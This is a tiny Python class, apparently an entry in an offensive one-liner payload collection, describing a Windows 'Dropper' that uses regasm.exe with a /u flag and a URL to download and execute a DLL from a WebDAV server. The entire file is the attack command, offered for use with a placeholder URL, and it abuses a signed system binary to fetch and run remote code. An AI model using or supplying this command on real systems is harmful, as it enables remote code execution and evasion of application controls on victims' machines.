class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Download and execute a dll file from a webdav server."
    function    = "Dropper"
    liner       = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u URL"
